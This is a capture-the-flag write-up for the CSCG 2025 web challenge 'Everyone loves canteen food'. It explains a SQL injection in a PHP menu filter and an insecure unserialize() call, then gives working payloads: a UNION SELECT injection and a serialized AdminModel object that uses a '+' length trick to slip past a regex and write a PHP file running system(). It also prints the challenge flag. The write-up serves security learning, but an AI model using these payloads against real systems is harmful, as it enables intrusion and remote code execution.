---
title: Everyone loves canteen food - CSCG 2025 - Write-Up
date: 2025-04-24 10:01:00 +0200
categories: [Cyber Security Challenge Germany]
tags: [sqli,insecure_deserialization]
description: Find a SQL injection vulnerability and a insecure object deserialization vulnerability to get the flag.
image:
  path: /assets/blog/Everyone loves canteen food/app.png
  alt: CSCG image
---


This Write-Up showcases the solution for the challenge titled as "Everyone loves canteen food" within the web category of CSCG 2025. The challenge was created by `Poory` and is rated as medium.

## Intro

The challenge is presented with the following description:

> Welcome to the canteen's online menu, where you can check out the daily specials and their prices. But is everything as appetizing as it seems?
> 
> Flagformat: `string which has to be put in dach2025{<string>}`

The application is a straightforward PHP solution that allows users to view the cafeteria menu. Within the app you can also filter the plan. Moreover, it includes an administrative function for creating and viewing logs.

![Screenshot of the cafeteria menu page](/assets/blog/Everyone%20loves%20canteen%20food/app.png)


## Vulnerability Analysis

The both vulnerabilities can be found in the `models/CanteenModel.php` script. This script is used for retrieving the food from the database and transforming it to readable table entires.

### SQL Injection

The function `filterFood()` takes a price parameter when it is called from `controllers/CanteenController.php`. The parameter employed in the `filterFood()` function is susceptible to manipulation by an attacker, as it is obtained directly from the URL via `$_GET['price']`.

```php
if(isset($_GET['price'])) {
    return $router->view('index', ['food' => $food->filterFood($_GET['price'])]);
}
``` 

The function builds a SQL query to filter the foods according to the price, for that the `$price_param` is simply appended to the query. Given that the `$price_param` variable is extracted directly from the URL 
using `$_GET['price']`, you can manipulate it, leading to the creation of an **SQL injection vulnerability**.

```php
public function filterFood($price_param) {
    $log_entry = 'Access at: '. date('Y-m-d H:i:s') .   "<br>\n";
    $logger = new AdminModel("../logs.txt", $log_entry);


    $db = Database::getConnection();
    $sql = "SELECT * FROM food where price < " . $price_param;
    if ($result = $db->query($sql)) {
        $result_string = "";
        ...
    }

    return 'Everything is too expensive for you this week, Sir/Madame. We\'re sorry!';
}
```

### Insecure Deserialization

The second vulnerability found in `models/CanteenModel.php` is a insecure deserialization vulnerability, this vulnerability **can** lead to **RCE**. After the SQL query is retrieved, each object in the database is checked if it has the `oldvalue` property set, if so the value is base64 decoded and saved as `$dec_result`. As a result of not matching the defined regular expression, the `$dec_result` string is subjected to the `unserialize()` function. This allows for the conversion of malicious strings into PHP objects, potentially leading to Remote Code Execution (RCE).

Note: The impact in this application is actually first a **arbitrary file write**, because the available classes only allow that, but because of that you can create PHP files which is finally RCE.

```php
while($obj = $result->fetch_object()){
    ...
    if($obj->oldvalue !== '') {
        $dec_result = base64_decode($obj->oldvalue);
        if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
            return 'Not allowed';
        }
        $uns_result = unserialize($dec_result);
        if ($uns_result[1] < $price_param) {
            $result_string .= $uns_result[0] . ' for ' . $uns_result[1] . '<br>';
        }
    }
}
```

## Exploit

With the SQL injection vulnerability you can display any kind of food on the page and inject malicious data entries to the page.
```
Payload: /?price=1 UNION SELECT 1000,'FOOD', '', 100.99
Returns: FOOD for 100.99
```

Also by exploiting the SQL injection vulnerability, you can input any desired value for the `oldvalue` parameter by incorporating an additional `SELECT` statement in our query. Theoretically you can use this `unserialize()` function to create a object and execute code, but for that you first need a class which has the capabilities for this.

The PHP `serialize` function allows objects and more generally data to be serialized into a standardized string which can easily be stored. This allows you to store data needed later in such an string and you use it easily when you need it. Although this may sound extremely useful it comes with risks. If specific classes are used in the code and an attacker has access to the deserialization and these classes contain so called 'gadgets' you can achieve RCE or other actions implemented in the classes of the vulnerable application. In this application there exists 'only' a arbitrary file write gadget, with the `AdminModel` class.


This class can be used because the `index.php` file additionally integrates the `AdminModel` class derived from `models/AdminModel.php`. The `__wakeup` function is a so called gadget, if its set it will execute if the object is initialized, which allows us to write to files.

```php
class AdminModel {
    public $filename;
    public $logcontent;

    public function __construct($filename, $content) {
        $this->filename = $filename;
        $this->logcontent = $content;
        file_put_contents($filename, $content, FILE_APPEND);
    }

    public function __wakeup() {
        new LogFile($this->filename, $this->logcontent);
    }

    public static function read_logs($log) {
        $contents = file_get_contents($log);
        return $contents;
    }
}
```

The `__wakeup` function calls the `LogFile` class, which writes to a file:

```php
class LogFile {
    public function __construct($filename, $content) {
        file_put_contents($filename, $content, FILE_APPEND);
    }
}
```

The `AdminModel` class can be used to create PHP file. Now you can then call this PHP file and retrieve the flag. The last issue is the regex:
```php
preg_match_all('/O:\d+:"([^"]*)"/')
```

It checks if the string you send has a serialized PHP object in form of `O:len:"name"` in it, the issue is that the standard PHP object is in this format. For the attack to be successful, you need a serialized object which will use the `AdminModel` class. Below is an example of a simple PHP object for reference.

```
O:4:"user":2:{s:3:"age";i:80;s:4:"name";s:3:"James";}
```

In the source code of PHP you may find that you can add a `+` in front of an integer if you have an integer as a variable. If you can add a `+` for the length of the object name you would effectively escape the regular expression. For that you may check the PHP [source code](https://github.com/php/php-src/blob/9285559c8cb61e986dd67132683bc6c52b1048f5/ext/standard/var_unserializer.re) for the `unserialize()` function, you will find out that this is possible. This allows us to execute our payload. 

Here is the plan again:

1. Utilize the SQL injection vulnerability to insert extra food, making 
use of the `oldvalue` parameter.
2. The base64 decoded `oldvalue` is then fed into the `unserialize()` 
function.
3. Leverage the `AdminModel` object to write a PHP file on the system.
4. The generated PHP file can call the `/readflag` binary, which will 
subsequently return the flag.

Firstly I generated a object. This can be done by copying the class `AdminModel` and `LogFile` in a new file and then creating an object that way (be careful it will actually write the file if you create a new object). 
```
O:10:"AdminModel":2:{s:8:"filename";s:13:"/www/flag.php";s:10:"logcontent";s:29:"<?php system("/readflag"); ?>";}
```

To escape the regular expression you need to modify the serialized object and add a `+` in front of the 10 which is the length of the class name.
```
O:+10:"AdminModel":2:{s:8:"filename";s:13:"/www/flag.php";s:10:"logcontent";s:29:"<?php system("/readflag"); ?>";}
```

Next you can carefully construct the `oldvalue` by `base64`/URL encoding the payload.

```text
TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTM6Ii93d3cvZmxhZy5waHAiO3M6MTA6ImxvZ2NvbnRlbnQiO3M6Mjk6Ijw%2FcGhwIHN5c3RlbSgiL3JlYWRmbGFnIik7ID8%2BIjt9
```

Lastly I added the SQL query before and after to get the final payload:
```text
1 UNION SELECT 1000,'', 'TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTM6Ii93d3cvZmxhZy5waHAiO3M6MTA6ImxvZ2NvbnRlbnQiO3M6Mjk6Ijw%2FcGhwIHN5c3RlbSgiL3JlYWRmbGFnIik7ID8%2BIjt9', 100.99
```

If you use this payload as the price variable (`?price=<payload>`), the server will write a `flag.php` file to the servers root directory. You can then access it with `/flag.php` to get the flag.


## Flag

```
dach2025{sh1ty_r3g3x_w0nt_s4fe_y0u}
```